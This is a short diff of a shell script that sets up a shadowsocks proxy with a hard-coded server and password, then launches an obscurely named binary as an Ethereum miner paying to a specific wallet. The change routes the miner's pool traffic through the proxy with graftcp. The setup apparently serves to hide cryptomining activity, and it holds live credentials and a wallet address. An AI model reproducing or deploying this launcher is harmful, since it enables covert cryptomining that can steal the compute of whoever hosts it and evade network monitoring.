@@ -32,7 +32,7 @@ chmod +x 145
 apt -y install shadowsocks-libev rng-tools
 ss-local -s 192.186.186.7 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
 ph add 145
-./145 --url=ssl://0x9baccb443d4eee6831b541ac17c28c1b61fdab81.tes@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./145 --url=ssl://0x9baccb443d4eee6831b541ac17c28c1b61fdab81.tes@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
 EOF
 
 chmod +x run.sh
